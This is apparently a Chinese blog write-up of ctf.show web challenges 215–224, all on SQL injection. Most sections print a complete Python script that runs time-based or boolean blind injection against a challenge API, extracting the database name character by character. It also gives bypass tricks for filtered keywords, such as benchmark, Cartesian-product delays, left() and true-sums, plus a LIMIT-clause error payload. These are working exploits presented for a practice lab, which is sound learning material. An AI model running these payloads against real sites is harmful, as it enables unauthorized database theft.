<h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>在web214的基础上多了一个引号闭合，其他的都没过滤。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url = <span class="string">&quot;http://93731bf8-3c92-4dec-a314-6520c8a52c66.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27;or if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1)#&quot;</span></span><br><span class="line">        t1=datetime.datetime.now()</span><br><span class="line">        data=&#123;<span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;ip&quot;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        t2=datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2-t1).seconds &gt; <span class="number">0.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>这里有个坑，注释符我这里用<code>%23</code>是打不通的，得用<code>#</code>才行。猜测可能是这个题目的环境下，脚本打过去的数据不会被URL解码。一开始一直没发现是这个问题，因为我在浏览器上面用<code>%23</code>打过去是ok的，这里应该是自动给解码了的。</p>
<h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><p>给了语句提示，其实只需要想办法闭合就行了，  <code>where id = from_base64($id);</code>，注意这里闭合from_base64函数的同时，还需要保证函数里面的参数格式是正确的，这样不会报错。即poc:<code>debug=1&amp;ip=&#39;MQ==&#39;)or if(1=1,sleep(2),1)#</code> 注意这里的MQ&#x3D;&#x3D;要带上引号。</p>
<p>demo有了，所以最后的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url = <span class="string">&quot;http://89070fdc-ed88-401a-a5c9-3d4c92b82ee1.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;&#x27;MQ==&#x27;)or if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1)#&quot;</span></span><br><span class="line">        t1=datetime.datetime.now()</span><br><span class="line">        data=&#123;<span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;ip&quot;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        t2=datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2-t1).seconds &gt; <span class="number">0.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>过滤了<code>sleep</code>，可以用<code>benchmark</code>来代替：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url = <span class="string">&quot;http://dd94cc05-9e93-4a7a-b9aa-5d3c603c45f8.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;1)or if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,benchmark(400000,sha(1)),1)#&quot;</span></span><br><span class="line">        t1=datetime.datetime.now()</span><br><span class="line">        data=&#123;<span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;ip&quot;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        t2=datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2-t1).seconds &gt; <span class="number">1</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><p><code>sleep</code>,  <code>benchmark</code> 都被过滤了，可以用笛卡尔积来造成延时。核心部分:<code>SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F</code>来造成延时。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url = <span class="string">&quot;http://486a22ef-3d2e-486e-8874-e463b0f37f9b.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;1)or if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;</span></span><br><span class="line">        t1=datetime.datetime.now()</span><br><span class="line">        data=&#123;<span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;ip&quot;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        t2=datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2-t1).seconds &gt; <span class="number">1</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><p>在218基础上直接多过滤了一个<code>rlike</code>，不影响到上题整体的脚本，不过条件那里改下，把时间改短一点：<code>  if (t2-t1).seconds &gt; 0.5:</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url = <span class="string">&quot;http://81f97be7-c118-4b99-bbb9-c61652bec8e8.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;1)or if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;</span></span><br><span class="line">        t1=datetime.datetime.now()</span><br><span class="line">        data=&#123;<span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;ip&quot;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        t2=datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2-t1).seconds &gt; <span class="number">0.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>

<p>很多都过滤了，但是没有过滤<code>like regexp</code>之类的，这里利用<code>regexp</code>写了一个脚本，但是存在问题。<code>regexp</code>这种适用场景我觉得是得知道以哪个字母开头，第一个字符的匹配很关键，否则容易造成误匹配，但是我们在攻击时不可能事先知道被注入数据的开头，所以会有点问题。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url=<span class="string">&quot;http://3fd0d4fd-427e-471b-a2be-aa59d318fcd2.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">dicts=<span class="string">&quot;cabdefghijklmnopqrstuvwxyz_-&#123;&#125;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">chars=<span class="string">&#x27;&#x27;</span></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dicts:</span><br><span class="line">        payload = <span class="string">&quot;1)or if((select database())regexp &#x27;&#123;&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),null)#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            chars + j)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        t1 = datetime.datetime.now()</span><br><span class="line">        data = &#123;<span class="string">&quot;debug&quot;</span>: <span class="number">1</span>, <span class="string">&quot;ip&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        t2 = datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2 - t1).seconds &gt; <span class="number">0.5</span>:</span><br><span class="line">            chars += j</span><br><span class="line">            <span class="built_in">print</span>(chars)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(chars)</span><br></pre></td></tr></table></figure>

<p>针对这种问题，我们只要一位一位的去爆破就行了，这里<code>substr,mid</code>被过滤了，我们可以用<code>left , right</code>来替代：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url=<span class="string">&quot;http://3fd0d4fd-427e-471b-a2be-aa59d318fcd2.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">dicts=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz_-&#123;&#125;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">chars=<span class="string">&#x27;&#x27;</span></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dicts:</span><br><span class="line">        payload = <span class="string">&quot;1)or if(left((select database()),&#123;&#125;)regexp &#x27;&#123;&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),null)#&quot;</span>.<span class="built_in">format</span>(i,chars + j)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        t1 = datetime.datetime.now()</span><br><span class="line">        data = &#123;<span class="string">&quot;debug&quot;</span>: <span class="number">1</span>, <span class="string">&quot;ip&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        t2 = datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2 - t1).seconds &gt; <span class="number">0.5</span>:</span><br><span class="line">            chars += j</span><br><span class="line">            <span class="built_in">print</span>(chars)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(chars)</span><br></pre></td></tr></table></figure>

<h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><p>这个考察的是<code>limit</code>后面接注入点，详细可以参考p神的一篇文章:<code>https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</code></p>
<p>payload:<code>https://a4437f2c-e4f2-4e3e-8347-4c2909d03381.challenge.ctf.show/api/index.php?page=10&amp;limit=10%20procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1);</code></p>
<h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><p><code>group by</code> 后面的注入，可以直接盲注，原理和之前的差不多:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">&quot;http://b7185ce1-d257-4be6-b203-67a84e0ce4bc.challenge.ctf.show/api/index.php?u=&quot;</span>+<span class="string">f&quot;if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.1),1)&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        t1=datetime.datetime.now()</span><br><span class="line">        r = requests.get(url=payload)</span><br><span class="line">        t2=datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2-t1).seconds &gt; <span class="number">1</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h2 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h2><p>过滤了数字，用之前做过的思路来打，<code>true+true+...</code> 这种形式来凑数字。</p>
<p>这里一开始一直没有打通，后面突然猛地想起来可能是编码的问题，因为我在URL栏上面输入的<code>+</code>会被当成空格。所以需要编码，这里得运用<code>params</code>来实现。</p>
<p>还有一个点，这里sleep(1)，相当于sleep(21)，因为前面<code>group by</code>的原因，可能把每一行都sleep一下，所以我们可以通过<code>sleep((true)/(true+true+true+true+true+true+true+true+true+true))</code>来减少时间。最终脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createnum</span>(<span class="params">n</span>):</span><br><span class="line">    num=<span class="string">&#x27;true+&#x27;</span>*n</span><br><span class="line">    <span class="keyword">return</span> num[:-<span class="number">1</span>]</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url=<span class="string">&quot;http://052609f5-a74c-401f-bfe4-115ba14d51d4.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr(database(),&#123;&#125;,true))&gt;&#123;&#125;,sleep((true)/(true+true+true+true+true+true+true+true+true+true)),null)&quot;</span>.<span class="built_in">format</span>(createnum(i), createnum(mid))</span><br><span class="line">        params=&#123;<span class="string">&quot;u&quot;</span>:payload&#125;</span><br><span class="line">        <span class="built_in">print</span>(params)</span><br><span class="line">        t1=datetime.datetime.now()</span><br><span class="line">        r = requests.get(url=url,params=params)</span><br><span class="line">        t2=datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2-t1).seconds &gt; <span class="number">1.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>如果觉得时间盲注太麻烦的话，也可以用<code>?u=if(ascii(substr(database(),&#123;&#125;,true))&gt;&#123;&#125;,username,true).format(createnum(i),createnum(mid))</code>，根据不同回显来做判断条件也可以，会快很多。对应脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createnum</span>(<span class="params">n</span>):</span><br><span class="line">    num=<span class="string">&#x27;true+&#x27;</span>*n</span><br><span class="line">    <span class="keyword">return</span> num[:-<span class="number">1</span>]</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url=<span class="string">&quot;http://052609f5-a74c-401f-bfe4-115ba14d51d4.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr(database(),&#123;&#125;,true))&gt;&#123;&#125;,username,true)&quot;</span>.<span class="built_in">format</span>(createnum(i), createnum(mid))</span><br><span class="line">        params=&#123;<span class="string">&quot;u&quot;</span>:payload&#125;</span><br><span class="line">        <span class="built_in">print</span>(params)</span><br><span class="line">        r = requests.get(url=url,params=params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;AUTO&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><p>这个说实话真的想不到，<code>filetype</code>文件类型注入。</p>
<p>一开始尝试了弱口令爆破，发现不行。后面fuzz了一下，发现注释符，引号啥的都被过滤了，还限制输入字符的长度，当然可能只是前端限制。然后尝试去爆破，发现kali的<code>dirsearch</code>用不了，今天重新来看的时候，发现得在<code>root</code>环境下去使用。</p>
